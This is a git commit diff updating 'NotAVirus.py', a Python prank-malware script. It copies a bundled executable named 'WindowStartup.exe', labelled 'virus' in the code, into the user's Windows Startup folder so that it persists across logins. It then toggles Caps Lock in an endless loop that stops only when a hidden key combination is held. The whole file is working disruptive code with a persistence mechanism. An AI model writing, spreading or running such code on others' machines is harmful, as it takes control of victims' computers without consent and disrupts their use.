f4e57469638e1dcc346a8e09a355e05efca45085
ThatRandomError <143558909+ThatRandomError@users.noreply.github.com>
2023-10-27 18:27:25 -0400

    Update NotAVirus.py

--- NotAVirus.py
+++ NotAVirus.py
@@ -1,31 +1,27 @@
 import os
+import sys
+import shutil
 import pyautogui
 import keyboard
-import shutil
-import sys
+
+def resource_path(r_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, r_path)
+
+virus = resource_path('WindowStartup.exe')
 
 user = os.getlogin()
-c_file = sys.argv[0] if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
 
-path = os.path.join(r'c:\Users', user, 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+path = os.path.join(r'C:\Users',user,'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 
-destination = os.path.join(path, os.path.basename(c_file))
-
-copy = True
-
-for file in os.listdir():
-    if(file == "NotAVirus.py"):
-        copy = False
-
-
-if(copy == True):
-    shutil.copy(c_file, destination)
+if(virus != os.path.join(path, 'WindowStartup.py')):
+    shutil.copy(virus, path)
 
 running = True
-while running:
-    pyautogui.press('capslock', interval=0.1)
+while running == True:
+    pyautogui.press('capslock', interval=0.15)
     if keyboard.is_pressed('q') and keyboard.is_pressed('w') and keyboard.is_pressed('o') and keyboard.is_pressed('p'):
         running = False
-
-
-
